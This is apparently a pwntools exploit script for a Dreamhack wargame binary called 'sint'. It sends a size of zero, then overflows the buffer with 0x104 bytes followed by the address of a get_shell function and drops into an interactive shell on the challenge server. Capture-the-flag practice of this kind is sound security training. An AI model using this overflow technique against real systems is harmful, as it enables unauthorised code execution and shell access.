from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/sint')
else:
    r = remote('host1.dreamhack.games', 15671)

get_shell = 0x8048659  # get_shell()

r.sendlineafter('Size: ', '0')
r.sendafter('Data: ', b'a' * 0x104 + p32(get_shell))

r.interactive()